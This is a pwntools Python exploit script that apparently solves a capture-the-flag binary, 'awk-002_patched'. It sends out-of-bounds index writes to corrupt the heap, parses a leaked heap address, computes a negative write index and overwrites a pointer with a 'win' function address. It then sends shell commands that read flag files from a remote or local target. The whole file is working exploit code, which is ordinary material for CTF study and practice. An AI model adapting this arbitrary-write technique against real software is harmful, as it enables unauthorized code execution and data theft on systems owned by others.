#!/usr/bin/env python3

from pwn import *
import codecs
import warnings

if args.SWARM:
    context.log_level = "ERROR"

exe = ELF("./awk-002_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.terminal = ["tmux", "splitw", "-h"]
warnings.filterwarnings("ignore", category=BytesWarning)

def debug():
    if args.GDB_DEBUG:
        gdb.attach(p, '''
        c
        ''')
        pause()

def conn():
    if args.LOCAL:
        p = process([exe.path])
    else:
        p = remote("addr", 1337)
    return p

p = conn()

def w(index, val):
    p.sendlineafter("Index:", str(index))
    p.sendlineafter(":", str(val))

w(531, 0xcd1)
p.sendlineafter("Index:", "0")
p.sendlineafter(":", "0"*0xd00)
p.sendlineafter("Index:", "1")
p.sendlineafter(":", "0"*0xc00)
w(792, "-")

p.recvuntil("set to")
heap_leak = int(p.recvline())
print(hex(heap_leak))

dis = - ((heap_leak - 0x18a0 - 0x404010) // 8)
print(dis)
win = 0x4011ff
debug()
w(dis, win)


if not args.SWARM:
    p.interactive()
else:
    # print out the flag to stdout
    p.sendline("cat ./flag*")
    p.sendline("cat /flag*")
    p.sendline("cat /home/*/flag*")
    print(p.recvall(timeout=3), flush=True)
